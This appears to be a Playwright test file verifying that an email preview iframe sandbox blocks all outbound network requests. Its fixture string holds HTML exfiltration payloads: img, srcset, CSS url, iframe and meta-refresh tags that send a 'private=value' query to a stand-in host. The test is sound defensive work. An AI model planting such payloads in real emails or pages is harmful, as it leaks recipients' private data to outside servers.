import { expect, test } from "@playwright/test";
import {
  EMAIL_BRAND_PORTRAIT_V1,
  renderEmailBrandImage,
} from "../../packages/contracts/src/email-branding";
import {
  emailPreviewDocument,
  illustratedEmailPreview,
} from "../../apps/web/src/email-preview-document";

test("email preview frames block query, srcset, CSS and automatic navigation exfiltration", async ({
  page,
}) => {
  const requests: string[] = [];
  await page.route("**/*", (route) => {
    requests.push(route.request().url());
    return route.abort();
  });
  const attack =
    '<p>Untrusted preview fixture</p><img src="https://example.invalid/brand.png?private=value" srcset="https://example.invalid/another.png?private=value 2x"><style>body{background-image:url(https://example.invalid/bg.png?private=value)}</style><iframe src="https://example.invalid/frame?private=value"></iframe><meta http-equiv="refresh" content="0;url=https://example.invalid/refresh?private=value">';
  const documents = [
    emailPreviewDocument(attack),
    await illustratedEmailPreview(
      `${renderEmailBrandImage()}<p style="background-image:url(https://example.invalid/bg.png?private=value)">Reviewed preview fixture</p>`,
    ),
  ];
  for (const [index, source] of documents.entries()) {
    await page.setContent(
      '<iframe sandbox="" referrerpolicy="no-referrer"></iframe>',
    );
    await page.locator("iframe").evaluate((frame, content) => {
      (frame as HTMLIFrameElement).srcdoc = content;
    }, source);
    await expect(
      page
        .locator("iframe")
        .contentFrame()
        .getByText(
          index ? "Reviewed preview fixture" : "Untrusted preview fixture",
        ),
    ).toBeVisible();
    expect(requests).toEqual([]);
  }
  const image = page.locator("iframe").contentFrame().locator("img");
  await expect
    .poll(() =>
      image.evaluate((node) => (node as HTMLImageElement).naturalWidth),
    )
    .toBe(384);
  await expect(image).toHaveJSProperty("naturalHeight", 210);
  await expect(image).toHaveAttribute("width", "128");
  await expect(image).toHaveAttribute("height", "70");
  await page.locator("iframe").evaluate(
    (frame, content) => {
      (frame as HTMLIFrameElement).srcdoc = content;
    },
    await illustratedEmailPreview(
      renderEmailBrandImage(EMAIL_BRAND_PORTRAIT_V1),
    ),
  );
  await expect(image).toHaveJSProperty("naturalWidth", 144);
  await expect(image).toHaveJSProperty("naturalHeight", 144);
  await expect(image).toHaveAttribute("width", "60");
  await expect(image).toHaveAttribute("height", "60");
  await expect(page.locator("iframe")).toHaveAttribute("sandbox", "");
  expect(requests).toEqual([]);
});
